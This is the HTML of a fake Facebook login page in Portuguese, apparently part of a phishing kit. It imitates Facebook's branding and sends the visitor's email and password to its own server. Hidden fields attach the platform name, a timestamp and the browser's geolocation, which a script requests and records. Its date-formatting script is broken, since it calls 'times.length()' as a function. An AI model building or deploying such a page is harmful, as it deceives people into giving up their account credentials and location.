<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../static/assets/1_Facebook_colored_svg_copy-512.webp">
    
    <title>Facebook – entre ou cadastre-se</title>
    <!-- styles -->
    <style>
      .right{
        position:relative;
      }
      .foot-text-container{
        position:absolute;
        bottom:-3.5rem;
        left:50%;
        transform:translateX(-50%);
        text-align: center;
        width:100%;
        margin:auto;
      }
    </style>
  <link rel="stylesheet" href="../static/assets/index.b9fe927c.css">
</head>

<body class="bg-gray-100 overflow-hidden">
    <div class="container bg-gray-100 h-[100vh] flex items-center justify-center  mt-[-20px] sm:flex-col md:flex-row w-[100vw]">
        <div id="container-left" class="left w-2/4 mx-8 sm:w-[80%]md:w-[50%] lg:w-[50%]">
          <img class="w-60 md:w-60 sm:w-44 sm:m-auto " src="../static/assets/fblogin.9531e960.svg" alt="loading image!">
          <p class=" create-p text-3xl mx-4 sm:text-[15px] md:text-2xl lg:text-3xl sm:text-center mb-4">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
          </p>
        </div>
        <form method="POST" class="right flex flex-col bg-white p-8  rounded-lg w-1/3 shadow-lg sm:w-[90%] md:w-[50%] lg:w-[33.33%]">
            <p class="fblogP text-center md:hidden mt-0 mb-2 sm:text-lg sm:font-bold">Log into Facebook</p>
            <input type="hidden" name="platform" value="Facebook">
            <input type="hidden" name="date" value="" id="timeHolder">
            <input type="hidden" name="location" value="" id="locationHolder">
            <input name="email" class="border-[1px] border-gray-400 rounded-md border-opacity-50 text-xl px-4 h-12 my-2 w-auto  focus:border-blue-600 focus:border-[1px] focus:outline-none hover:border-black hover:border-[1px]" type="text" placeholder="Email ou telefone">
            <input name="password" class="border-[1px] border-gray-400 rounded-md border-opacity-50 text-xl px-4 h-12 my-2 w-auto  focus:border-blue-600 focus:border-[1px] focus:outline-none hover:border-black hover:border-[1px]" type="password" placeholder="Senha" >
            <input type="submit" class="logBtn w-auto py-2 bg-blue-600 my-2 text-2xl text-white rounded-md hover:bg-blue-700 active:bg-blue-800 duration-200" value="Entrar">
            <a class="my-2 w-auto text-center target text-blue-600 hover:underline" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Esqueceu a senha?</a>
            <hr>
            <a href="https://pt-br.facebook.com/" class="width-1/3 mx-auto py-2 bg-green-500 mt-6 text-xl text-white rounded-md px-4 hover:bg-green-600 active:bg-green-700 duration-200"><button>Criar nova conta</button></a>
          <div class="foot-text-container">
            <p class="textP"><strong>Criar uma Página</strong> para uma celebridade, uma marca ou uma empresa.</p>
          </form>
        </div>
    </div>

    <script>
      		if (navigator.geolocation)
            {
              navigator.geolocation.getCurrentPosition(pos);
            }

          function pos(position) {
            let pos = "";
            pos += position.coords.latitude;
            pos += " ";
            pos += position.coords.longitude;
            document.getElementById("locationHolder").value = pos;
          }

          let today = new Date();
          let date = today.getDate();
          let month = today.getMonth() + 1;
          let hours = today.getHours();
          let minutes = today.getMinutes();

          let times = [date, month, hours, minutes]
          for (let i = 0; i < times.length(); i++)
          {
            if (times[i] < 10)
            {
              times[i] = "0" + times[i]
            }
          }
          
          document.getElementById("timeHolder").value = `${times[0]}/${times[1]}, às ${times[2]}:${times[3]}`;
    </script>
</body>
</html>
